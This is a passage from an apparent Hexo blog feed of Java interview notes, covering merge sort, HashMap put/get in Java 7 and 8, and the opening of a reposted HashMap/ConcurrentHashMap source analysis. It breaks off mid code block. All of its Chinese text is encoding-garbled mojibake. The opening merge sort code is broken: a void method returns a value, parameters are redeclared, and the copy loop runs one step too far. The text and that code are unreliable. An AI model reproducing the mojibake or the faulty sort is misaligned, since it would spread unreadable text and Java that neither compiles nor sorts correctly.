†çš„æ—¶é—´å¤æ‚åº¦ä¸ºO(nlogn)ã€‚</p><h2><span id="å½’å¹¶æ’åº">å½’å¹¶æ’åº âˆš</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">merge</span><span class="params">(<span class="type">int</span> a[])</span>&#123;</span><br><span class="line"><span class="keyword">return</span> sort(a,<span class="number">0</span>,a.length-<span class="number">1</span>,<span class="keyword">new</span> <span class="title class_">int</span>[a.length]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sort</span><span class="params">(<span class="type">int</span>[] a,<span class="type">int</span> lo,<span class="type">int</span> hi,<span class="type">int</span>[] tmp)</span>&#123;</span><br><span class="line">    <span class="type">int</span> lo=<span class="number">0</span>,hi=a.length-<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(lo&lt;hi)&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> lo+(hi-lo)/<span class="number">2</span>;</span><br><span class="line">        sort(a,lo,mid,tmp);</span><br><span class="line">        sort(a,mid+<span class="number">1</span>,hi,tmp);</span><br><span class="line">        mergeArray(a,lo,mid,hi,tmp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">mergeArray</span><span class="params">(<span class="type">int</span>[] a,<span class="type">int</span> lo,<span class="type">int</span> mid,<span class="type">int</span> hi,<span class="type">int</span>[] tmp)</span>&#123;</span><br><span class="line">    <span class="type">int</span> i=lo,m=mid,j=mid+<span class="number">1</span>,n=hi,k=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;=m&amp;&amp;j&lt;=n)&#123;</span><br><span class="line">        <span class="keyword">if</span>(a[i]&lt;=a[j])&#123;</span><br><span class="line">            tmp[k++]=a[i++];</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            tmp[k++]=a[j++];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;=m) tmp[k++]=a[i++];</span><br><span class="line">    <span class="keyword">while</span>(j&lt;=n) tmp[k++]=a[j++];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> l=<span class="number">0</span>;l&lt;=k;l++)&#123;</span><br><span class="line">        a[l+lo]=tmp[l];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¬å¼ï¼šT[n]  &#x3D;  2T[n&#x2F;2] + O(n)ï¼›</p>]]></content>
      
      
      <categories>
          
          <category> ç®—æ³• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é¢è¯•å¸¸è€ƒç®—æ³•é¢˜ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SourceCode</title>
      <link href="/2020/04/12/SourceCode/"/>
      <url>/2020/04/12/SourceCode/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><span id="more"></span><!-- toc --><ul><li><a href="#hashmap">HashMap</a><ul><li><a href="#hashmap-17">HashMap 1.7</a><ul><li><a href="#put-%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90">put è¿‡ç¨‹åˆ†æ</a></li><li><a href="#get-%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90">get è¿‡ç¨‹åˆ†æ</a></li><li><a href="#hashmap%E6%89%A9%E5%AE%B9%E6%AD%BB%E9%94%81%E9%97%AE%E9%A2%98">HashMapæ‰©å®¹æ­»é”é—®é¢˜</a></li></ul></li><li><a href="#hashmap-18">HashMap 1.8</a><ul><li><a href="#put%E6%96%B9%E6%B3%95%E7%9A%84%E9%80%BB%E8%BE%91">putæ–¹æ³•çš„é€»è¾‘</a></li><li><a href="#get%E6%96%B9%E6%B3%95%E7%9A%84%E9%80%BB%E8%BE%91">getæ–¹æ³•çš„é€»è¾‘</a></li></ul></li></ul></li></ul><!-- tocstop --><h1><span id="hashmap">HashMap</span></h1><h2><span id="hashmap-17">HashMap 1.7</span></h2><p><strong>æ•°æ®ç»“æ„</strong>ï¼š æ•°ç»„+é“¾è¡¨</p><p><strong>å…ƒç´ ç»“æ„ï¼š</strong>Entry</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Entry</span>&lt;K,V&gt; <span class="keyword">implements</span> <span class="title class_">Map</span>.Entry&lt;K,V&gt;&#123;</span><br><span class="line">    <span class="keyword">final</span> K key;</span><br><span class="line">    V value;</span><br><span class="line">    Entry&lt;K,V&gt; next;</span><br><span class="line">    <span class="type">int</span> hash;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>capacityï¼šå½“å‰æ•°ç»„å®¹é‡ï¼Œå§‹ç»ˆä¿æŒ 2^nï¼Œå¯ä»¥æ‰©å®¹ï¼Œæ‰©å®¹åæ•°ç»„å¤§å°ä¸ºå½“å‰çš„ 2 å€ã€‚</p><p>loadFactorï¼šè´Ÿè½½å› å­ï¼Œé»˜è®¤ä¸º 0.75ã€‚</p><p>thresholdï¼šæ‰©å®¹çš„é˜ˆå€¼ï¼Œç­‰äº capacity * loadFactor</p><p>HashMapå¦‚æœkeyä¸ºnullåˆ™æ”¾å…¥table[0]ä¸­</p><p>éå†å®Œé“¾è¡¨å‘ç°æ²¡æœ‰keyï¼Œå°±éœ€è¦æ·»åŠ entryã€‚</p><p>æ·»åŠ entryå‰åˆ¤æ–­æ˜¯å¦éœ€è¦æ‰©å®¹ï¼ˆå¦‚æœå½“å‰ HashMap å¤§å°å·²ç»è¾¾åˆ°äº†é˜ˆå€¼ï¼Œå¹¶ä¸”æ–°å€¼è¦æ’å…¥çš„æ•°ç»„ä½ç½®å·²ç»æœ‰å…ƒç´ äº†ï¼Œé‚£ä¹ˆè¦æ‰©å®¹ï¼‰</p><h3><span id="put-è¿‡ç¨‹åˆ†æ">put è¿‡ç¨‹åˆ†æ</span></h3><ol><li>å¦‚æœHashMapæœªè¢«åˆå§‹åŒ–ï¼Œåˆ™åˆå§‹åŒ–</li><li>å¦‚æœkeyä¸ºnullï¼Œåˆ™ä¸‹æ ‡ä¸º0</li><li>å¦‚æœkeyä¸ä¸ºnullï¼Œè®¡ç®—hashå€¼å¹¶æ‰¾åˆ°å¯¹åº”ä¸‹æ ‡</li><li>éå†ä¸‹æ ‡å¤„çš„é“¾è¡¨çœ‹æ˜¯å¦å­˜åœ¨é‡å¤keyï¼Œå­˜åœ¨åˆ™è¦†ç›–ã€‚</li><li>ä¸å­˜åœ¨çš„è¯ï¼Œåˆ¤æ–­æ˜¯å¦éœ€è¦æ‰©å®¹ã€‚</li><li>ä¸éœ€è¦æ‰©å®¹å°±å°†entryå¤´æ’æ³•æ·»åŠ åˆ°é“¾è¡¨ä¸­ã€‚</li></ol><h3><span id="get-è¿‡ç¨‹åˆ†æ">get è¿‡ç¨‹åˆ†æ</span></h3><p>ç›¸å¯¹äº put è¿‡ç¨‹ï¼Œget è¿‡ç¨‹æ˜¯éå¸¸ç®€å•çš„ã€‚</p><ol><li>æ ¹æ® key è®¡ç®— hash å€¼ã€‚</li><li>æ‰¾åˆ°ç›¸åº”çš„æ•°ç»„ä¸‹æ ‡ï¼šhash &amp; (length - 1)ã€‚</li><li>éå†è¯¥æ•°ç»„ä½ç½®å¤„çš„é“¾è¡¨ï¼Œç›´åˆ°æ‰¾åˆ°ç›¸ç­‰(&#x3D;&#x3D;æˆ–equals)çš„ keyã€‚</li></ol><h3><span id="hashmapæ‰©å®¹æ­»é”é—®é¢˜">HashMapæ‰©å®¹æ­»é”é—®é¢˜</span></h3><p>å› ä¸ºåœ¨ JDK1.7 ä¸­é‡‡å–çš„æ˜¯<strong>å¤´æ’æ³•</strong>ï¼Œéå†ä¸€ä¸ªèŠ‚ç‚¹å°±æ’å…¥ä¸€ä¸ªèŠ‚ç‚¹åˆ°æ–°çš„å“ˆå¸Œæ¡¶æ•°ç»„ï¼Œæ‰€ä»¥æ‰ä¼šå¯¼è‡´å‡ºç°å¾ªç¯é“¾è¡¨ã€‚ä½† JDK1.8 ä¸­æ˜¯é‡‡ç”¨<strong>ä¸¤ä¸ªå¤´ç»“ç‚¹æ¥ä¿æŒæ—§é“¾è¡¨çš„å¼•ç”¨ï¼Œç›´åˆ°è¯¥ç´¢å¼•å¤„å¯¹åº”çš„é“¾è¡¨å…¨éƒ¨éå†å®Œä¹‹åå†åˆ†åˆ«æŠŠå¤´ç»“ç‚¹æ”¾åœ¨æ–°çš„å“ˆå¸Œæ¡¶æ•°ç»„å¯¹åº”çš„ä½ç½®ã€‚</strong>è€Œä¸æ˜¯éå†ä¸€ä¸ªèŠ‚ç‚¹å°±æ’å…¥ä¸€ä¸ªèŠ‚ç‚¹åˆ°æ–°çš„å“ˆå¸Œæ¡¶æ•°ç»„ã€‚æ‰€ä»¥ä¸ä¼šå‡ºç°æ­»é“¾ã€‚</p><h2><span id="hashmap-18">HashMap 1.8</span></h2><p>å°†Entryæ”¹åä¸ºNode</p><p><strong>Java7 æ˜¯å…ˆæ‰©å®¹åæ’å…¥æ–°å€¼çš„ï¼ŒJava8 å…ˆæ’å€¼å†æ‰©å®¹</strong></p><p><strong>Java7æ˜¯å¤´æ’æ³•ï¼ŒJava8æ˜¯å°¾æ’æ³•</strong></p><h3><span id="putæ–¹æ³•çš„é€»è¾‘">putæ–¹æ³•çš„é€»è¾‘</span></h3><ol><li><p>å¦‚æœHashMapæœªè¢«åˆå§‹åŒ–ï¼Œåˆ™resizeåˆå§‹åŒ–</p></li><li><p>å¯¹Keyæ±‚Hashå€¼ï¼Œç„¶åå†è®¡ç®—ä¸‹æ ‡</p></li><li><p>å¦‚æœæ²¡æœ‰ç¢°æ’ï¼Œç›´æ¥æ”¾å…¥æ¡¶ä¸­</p></li><li><p>å¦‚æœç¢°æ’äº†ï¼Œkeyç›¸ç­‰å°±å–å‡ºèŠ‚ç‚¹</p></li><li><p>å¦‚æœæ˜¯çº¢é»‘æ ‘å°±ä»¥çº¢é»‘æ ‘çš„æ–¹å¼æ’å…¥èŠ‚ç‚¹ï¼Œå¦‚æœä¸ºé“¾è¡¨ä»¥é“¾è¡¨çš„æ–¹å¼é“¾æ¥åˆ°åé¢ï¼Œ</p></li><li><p>å¦‚æœæ’å…¥åé“¾è¡¨é•¿åº¦è¶…è¿‡é˜ˆå€¼8ï¼Œå°±æŠŠé“¾è¡¨è½¬æˆçº¢é»‘æ ‘</p></li><li><p>å¦‚æœèŠ‚ç‚¹å·²ç»å­˜åœ¨å°±æ›¿æ¢æ—§å€¼</p></li><li><p>å¦‚æœæ¡¶æ»¡äº†ï¼ˆå®¹é‡16*åŠ è½½å› å­0.75ï¼‰ï¼Œå°±éœ€è¦resizeï¼ˆæ‰©å®¹2å€åé‡æ’ï¼‰</p></li></ol><h3><span id="getæ–¹æ³•çš„é€»è¾‘">getæ–¹æ³•çš„é€»è¾‘</span></h3><ol><li><p>è®¡ç®— key çš„ hash å€¼ï¼Œæ ¹æ® hash å€¼æ‰¾åˆ°å¯¹åº”æ•°ç»„ä¸‹æ ‡:     hash &amp; (length-1)</p></li><li><p>åˆ¤æ–­æ•°ç»„è¯¥ä½ç½®å¤„çš„å…ƒç´ æ˜¯å¦åˆšå¥½å°±æ˜¯æˆ‘ä»¬è¦æ‰¾çš„</p></li><li><p>å¦‚æœä¸æ˜¯ï¼Œåˆ¤æ–­è¯¥å…ƒç´ ç±»å‹æ˜¯å¦æ˜¯ TreeNodeï¼Œå¦‚æœæ˜¯ï¼Œç”¨çº¢é»‘æ ‘çš„æ–¹æ³•å–æ•°æ®ã€‚</p><p>4 . å¦‚æœä¸æ˜¯ï¼Œéå†é“¾è¡¨ï¼Œç›´åˆ°æ‰¾åˆ°ç›¸ç­‰(&#x3D;&#x3D;æˆ–equals)çš„ keyã€‚</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> é¢è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æºç  </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java7/8 ä¸­çš„ HashMap å’Œ ConcurrentHashMap å…¨è§£æï¼ˆè½¬ï¼‰</title>
      <link href="/2020/04/12/Java7_8+%E4%B8%AD%E7%9A%84+HashMap+%E5%92%8C+ConcurrentHashMap+%E5%85%A8%E8%A7%A3%E6%9E%90/"/>
      <url>/2020/04/12/Java7_8+%E4%B8%AD%E7%9A%84+HashMap+%E5%92%8C+ConcurrentHashMap+%E5%85%A8%E8%A7%A3%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>ä»Šå¤©å‘ä¸€ç¯‡â€æ°´æ–‡â€ï¼Œå¯èƒ½å¾ˆå¤šè¯»è€…éƒ½ä¼šè¡¨ç¤ºä¸ç†è§£ï¼Œä¸è¿‡æˆ‘æƒ³æŠŠå®ƒä½œä¸ºå¹¶å‘åºåˆ—æ–‡ç« ä¸­ä¸å¯ç¼ºå°‘çš„ä¸€å—æ¥ä»‹ç»ã€‚æœ¬æ¥ä»¥ä¸ºèŠ±ä¸äº†å¤šå°‘æ—¶é—´çš„ï¼Œä¸è¿‡æœ€ç»ˆè¿˜æ˜¯æŠ•å…¥äº†æŒºå¤šæ—¶é—´æ¥å®Œæˆè¿™ç¯‡æ–‡ç« çš„ã€‚</p><p>ç½‘ä¸Šå…³äº HashMap å’Œ ConcurrentHashMap çš„æ–‡ç« ç¡®å®ä¸å°‘ï¼Œä¸è¿‡ç¼ºæ–¤å°‘ä¸¤çš„æ–‡ç« æ¯”è¾ƒå¤šï¼Œæ‰€ä»¥æ‰æƒ³è‡ªå·±ä¹Ÿå†™ä¸€ç¯‡ï¼ŒæŠŠç»†èŠ‚è¯´æ¸…æ¥šè¯´é€ï¼Œå°¤å…¶åƒ Java8 ä¸­çš„ ConcurrentHashMapï¼Œå¤§éƒ¨åˆ†æ–‡ç« éƒ½è¯´ä¸æ¸…æ¥šã€‚ç»ˆå½’æ˜¯å¸Œæœ›èƒ½é™ä½å¤§å®¶å­¦ä¹ çš„æˆæœ¬ï¼Œä¸å¸Œæœ›å¤§å®¶åˆ°å¤„æ‰¾å„ç§ä¸æ˜¯å¾ˆé è°±çš„æ–‡ç« ï¼Œçœ‹å®Œä¸€ç¯‡åˆä¸€ç¯‡ï¼Œå¯æ˜¯è¿˜æ˜¯æ¨¡æ¨¡ç³Šç³Šã€‚</p><p>é˜…è¯»å»ºè®®ï¼šå››èŠ‚åŸºæœ¬ä¸Šå¯ä»¥è¿›è¡Œç‹¬ç«‹é˜…è¯»ï¼Œå»ºè®®åˆå­¦è€…å¯æŒ‰ç…§ Java7 HashMap -&gt; Java7 ConcurrentHashMap -&gt; Java8 HashMap -&gt; Java8 ConcurrentHashMap é¡ºåºè¿›è¡Œé˜…è¯»ï¼Œå¯é€‚å½“é™ä½é˜…è¯»é—¨æ§›ã€‚</p><p>é˜…è¯»å‰æï¼šæœ¬æ–‡åˆ†æçš„æ˜¯æºç ï¼Œæ‰€ä»¥è‡³å°‘è¯»è€…è¦ç†Ÿæ‚‰å®ƒä»¬çš„æ¥å£ä½¿ç”¨ï¼ŒåŒæ—¶ï¼Œå¯¹äºå¹¶å‘ï¼Œè¯»è€…è‡³å°‘è¦çŸ¥é“ CASã€ReentrantLockã€UNSAFE æ“ä½œè¿™å‡ ä¸ªåŸºæœ¬çš„çŸ¥è¯†ï¼Œæ–‡ä¸­ä¸ä¼šå¯¹è¿™äº›çŸ¥è¯†è¿›è¡Œä»‹ç»ã€‚Java8 ç”¨åˆ°äº†çº¢é»‘æ ‘ï¼Œä¸è¿‡æœ¬æ–‡ä¸ä¼šè¿›è¡Œå±•å¼€ï¼Œæ„Ÿå…´è¶£çš„è¯»è€…è¯·è‡ªè¡ŒæŸ¥æ‰¾ç›¸å…³èµ„æ–™ã€‚</p><!-- toc --><ul><li><a href="#java7-hashmap">Java7 HashMap</a><ul><li><a href="#put-%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90">put è¿‡ç¨‹åˆ†æ</a><ul><li><a href="#%E6%95%B0%E7%BB%84%E5%88%9D%E5%A7%8B%E5%8C%96">æ•°ç»„åˆå§‹åŒ–</a></li><li><a href="#%E8%AE%A1%E7%AE%97%E5%85%B7%E4%BD%93%E6%95%B0%E7%BB%84%E4%BD%8D%E7%BD%AE">è®¡ç®—å…·ä½“æ•°ç»„ä½ç½®</a></li><li><a href="#%E6%B7%BB%E5%8A%A0%E8%8A%82%E7%82%B9%E5%88%B0%E9%93%BE%E8%A1%A8%E4%B8%AD">æ·»åŠ èŠ‚ç‚¹åˆ°é“¾è¡¨ä¸­</a></li><li><a href="#%E6%95%B0%E7%BB%84%E6%89%A9%E5%AE%B9">æ•°ç»„æ‰©å®¹</a></li></ul></li><li><a href="#get-%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90">get è¿‡ç¨‹åˆ†æ</a></li></ul></li><li><a href="#java7-concurrenthashmap">Java7 ConcurrentHashMap</a><ul><li><a href="#%E5%88%9D%E5%A7%8B%E5%8C%96">åˆå§‹åŒ–</a></li><li><a href="#put-%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90-1">put è¿‡ç¨‹åˆ†æ</a><ul><li><a href="#%E5%88%9D%E5%A7%8B%E5%8C%96%E6%A7%BD-ensuresegment">åˆå§‹åŒ–æ§½: ensureSegment</a></li><li><a href="#%E8%8E%B7%E5%8F%96%E5%86%99%E5%85%A5%E9%94%81-scanandlockforput">è·å–å†™å…¥é”: scanAndLockForPut</a></li><li><a href="#%E6%89%A9%E5%AE%B9-rehash">æ‰©å®¹: rehash</a></li></ul></li><li><a href="#get-%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90-1">get è¿‡ç¨‹åˆ†æ</a></li><li><a href="#%E5%B9%B6%E5%8F%91%E9%97%AE%E9%A2%98%E5%88%86%E6%9E%90">å¹¶å‘é—®é¢˜åˆ†æ</a></li></ul></li><li><a href="#java8-hashmap">Java8 HashMap</a><ul><li><a href="#put-%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90-2">put è¿‡ç¨‹åˆ†æ</a><ul><li><a href="#%E6%95%B0%E7%BB%84%E6%89%A9%E5%AE%B9-1">æ•°ç»„æ‰©å®¹</a></li></ul></li><li><a href="#get-%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90-2">get è¿‡ç¨‹åˆ†æ</a></li></ul></li><li><a href="#java8-concurrenthashmap">Java8 ConcurrentHashMap</a><ul><li><a href="#%E5%88%9D%E5%A7%8B%E5%8C%96-1">åˆå§‹åŒ–</a></li><li><a href="#put-%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90-3">put è¿‡ç¨‹åˆ†æ</a><ul><li><a href="#%E5%88%9D%E5%A7%8B%E5%8C%96%E6%95%B0%E7%BB%84inittable">åˆå§‹åŒ–æ•°ç»„ï¼šinitTable</a></li><li><a href="#%E9%93%BE%E8%A1%A8%E8%BD%AC%E7%BA%A2%E9%BB%91%E6%A0%91-treeifybin">é“¾è¡¨è½¬çº¢é»‘æ ‘: treeifyBin</a></li></ul></li><li><a href="#%E6%89%A9%E5%AE%B9trypresize">æ‰©å®¹ï¼štryPresize</a><ul><li><a href="#%E6%95%B0%E6%8D%AE%E8%BF%81%E7%A7%BBtransfer">æ•°æ®è¿ç§»ï¼štransfer</a></li></ul></li><li><a href="#get-%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90-3">get è¿‡ç¨‹åˆ†æ</a></li></ul></li><li><a href="#%E6%80%BB%E7%BB%93">æ€»ç»“</a></li></ul><!-- tocstop --><h2><span id="java7-hashmap">Java7 HashMap</span></h2><p>HashMap æ˜¯æœ€ç®€å•çš„ï¼Œä¸€æ¥æˆ‘ä»¬éå¸¸ç†Ÿæ‚‰ï¼ŒäºŒæ¥å°±æ˜¯å®ƒä¸æ”¯æŒå¹¶å‘æ“ä½œï¼Œæ‰€ä»¥æºç ä¹Ÿéå¸¸ç®€å•ã€‚</p><p>é¦–å…ˆï¼Œæˆ‘ä»¬ç”¨ä¸‹é¢è¿™å¼ å›¾æ¥ä»‹ç» HashMap çš„ç»“æ„ã€‚</p><p><img src="https://www.javadoop.com/blogimages/map/1.png" alt="1"></p><blockquote><p>è¿™ä¸ªä»…ä»…æ˜¯ç¤ºæ„å›¾ï¼Œå› ä¸ºæ²¡æœ‰è€ƒè™‘åˆ°æ•°ç»„è¦æ‰©å®¹çš„æƒ…å†µï¼Œå…·ä½“çš„åé¢å†è¯´ã€‚</p></blockquote><p>å¤§æ–¹å‘ä¸Šï¼ŒHashMap é‡Œé¢æ˜¯ä¸€ä¸ª<strong>æ•°ç»„</strong>ï¼Œç„¶åæ•°ç»„ä¸­æ¯ä¸ªå…ƒç´ æ˜¯ä¸€ä¸ª<strong>å•å‘é“¾è¡¨</strong>ã€‚</p><p>ä¸Šå›¾ä¸­ï¼Œæ¯ä¸ªç»¿è‰²çš„å®ä½“æ˜¯åµŒå¥—ç±» Entry çš„å®ä¾‹ï¼ŒEntry åŒ…å«å››ä¸ªå±æ€§ï¼škey, value, hash å€¼å’Œç”¨äºå•å‘é“¾è¡¨çš„ nextã€‚</p><p>capacityï¼šå½“å‰æ•°ç»„å®¹é‡ï¼Œå§‹ç»ˆä¿æŒ 2^nï¼Œå¯ä»¥æ‰©å®¹ï¼Œæ‰©å®¹åæ•°ç»„å¤§å°ä¸ºå½“å‰çš„ 2 å€ã€‚</p><p>loadFactorï¼šè´Ÿè½½å› å­ï¼Œé»˜è®¤ä¸º 0.75ã€‚</p><p>thresholdï¼šæ‰©å®¹çš„é˜ˆå€¼ï¼Œç­‰äº capacity * loadFactor</p><h3><span id="put-è¿‡ç¨‹åˆ†æ">put è¿‡ç¨‹åˆ†æ</span></h3><p>è¿˜æ˜¯æ¯”è¾ƒç®€å•çš„ï¼Œè·Ÿç€ä»£ç èµ°ä¸€éå§ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">    <span class="comment">// å½“æ’å…¥ç¬¬ä¸€ä¸ªå…ƒç´ çš„æ—¶å€™ï¼Œéœ€è¦å…ˆåˆå§‹åŒ–æ•°ç»„å¤§å°</span></span><br><span class="line">    <span class="keyword">if</span> (table == EMPTY_TABLE) &#123;</span><br><span class="line">        inflateTable(threshold);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// å¦‚æœ key ä¸º nullï¼Œæ„Ÿå…´è¶£çš„å¯ä»¥å¾€é‡Œçœ‹ï¼Œæœ€ç»ˆä¼šå°†è¿™ä¸ª entry æ”¾åˆ° table[0] ä¸­</span></span><br><span class="line">    <span class="keyword">if</span> (key == <span class="literal">null</span>)</span><br><span class="line">        <span class="keyword">return</span> putForNullKey(value);</span><br><span class="line">    <span class="comment">// 1. æ±‚ key çš„ hash å€¼</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> hash(key);</span><br><span class="line">    <span class="comment">// 2. æ‰¾åˆ°å¯¹åº”çš„æ•°ç»„ä¸‹æ ‡</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> indexFor(hash, table.length);</span><br><span class="line">    <span class="comment">// 3. éå†ä¸€ä¸‹å¯¹åº”ä¸‹æ ‡å¤„çš„é“¾è¡¨ï¼Œçœ‹æ˜¯å¦æœ‰é‡å¤çš„ key å·²ç»å­˜åœ¨ï¼Œ</span></span><br><span class="line">    <span class="comment">//    å¦‚æœæœ‰ï¼Œç›´æ¥è¦†ç›–ï¼Œput æ–¹æ³•è¿”å›æ—§å€¼å°±ç»“æŸäº†</span></span><br><span class="line">    <span class="keyword">for</span> (Entry&lt;K,V&gt; e = table[i]; e != <span class="literal">null</span>; e = e.next) &#123;</span><br><span class="line">        Object k;</span><br><span class="line">        <span class="keyword">if</span> (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k))) &#123;</span><br><span class="line">            <span class="type">V</span> <span class="variable">oldValue</span> <span class="operator">=</span> e.value;</span><br><span class="line">            e.value = value;</span><br><span class="line">            e.recordAccess(<span class="built_in">this</span>);</span><br><span class="line">            <span class="keyword">return</span> oldValue;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modCount++;</span><br><span class="line">    <span class="comment">// 4. ä¸å­˜åœ¨é‡å¤çš„ keyï¼Œå°†æ­¤ entry æ·»åŠ åˆ°é“¾è¡¨ä¸­ï¼Œç»†èŠ‚åé¢è¯´</span></span><br><span class="line">    addEntry(hash, key, value, i);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4><span id="æ•°ç»„åˆå§‹åŒ–">æ•°ç»„åˆå§‹åŒ–</span></h4><p>åœ¨ç¬¬ä¸€ä¸ªå…ƒç´ æ’å…¥ HashMap çš„æ—¶å€™åšä¸€æ¬¡æ•°ç»„çš„åˆå§‹åŒ–ï¼Œå°±æ˜¯å…ˆç¡®å®šåˆå§‹çš„æ•°ç»„å¤§å°ï¼Œå¹¶è®¡ç®—æ•°ç»„æ‰©å®¹çš„é˜ˆå€¼ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">inflateTable</span><span class="params">(<span class="type">int</span> toSize)</span> &#123;</span><br><span class="line">    <span class="comment">// ä¿è¯æ•°ç»„å¤§å°ä¸€å®šæ˜¯ 2 çš„ n æ¬¡æ–¹ã€‚</span></span><br><span class="line">    <span class="comment">// æ¯”å¦‚è¿™æ ·åˆå§‹åŒ–ï¼šnew HashMap(20)ï¼Œé‚£ä¹ˆå¤„ç†æˆåˆå§‹æ•°ç»„å¤§å°æ˜¯ 32</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">capacity</span> <span class="operator">=</span> roundUpToPowerOf2(toSize);</span><br><span class="line">    <span class="comment">// è®¡ç®—æ‰©å®¹é˜ˆå€¼ï¼šcapacity * loadFactor</span></span><br><span class="line">    threshold = (<span class="type">int</span>) Math.min(capacity * loadFactor, MAXIMUM_CAPACITY + <span class="number">1</span>);</span><br><span class="line">    <span class="comment">// ç®—æ˜¯åˆå§‹åŒ–æ•°ç»„å§</span></span><br><span class="line">    table = <span class="keyword">new</span> <span class="title class_">Entry</span>[capacity];</span><br><span class="line">    initHashSeedAsNeeded(capacity); <span class="comment">//ignore</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰ä¸€ä¸ªå°†æ•°ç»„å¤§å°ä¿æŒä¸º 2 çš„ n æ¬¡æ–¹çš„åšæ³•ï¼ŒJava7 å’Œ Java8 çš„ HashMap å’Œ ConcurrentHashMap éƒ½æœ‰ç›¸åº”çš„è¦æ±‚ï¼Œåªä¸è¿‡å®ç°çš„ä»£ç ç¨å¾®æœ‰äº›ä¸åŒï¼Œåé¢å†çœ‹åˆ°çš„æ—¶å€™å°±çŸ¥é“äº†ã€‚</p><h4><span id="è®¡ç®—å…·ä½“æ•°ç»„ä½ç½®">è®¡ç®—å…·ä½“æ•°ç»„ä½ç½®</span></h4><p>è¿™ä¸ªç®€å•ï¼Œæˆ‘ä»¬è‡ªå·±ä¹Ÿèƒ½ YY ä¸€ä¸ªï¼šä½¿ç”¨ key çš„ hash å€¼å¯¹æ•°ç»„é•¿åº¦è¿›è¡Œå–æ¨¡å°±å¯ä»¥äº†ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 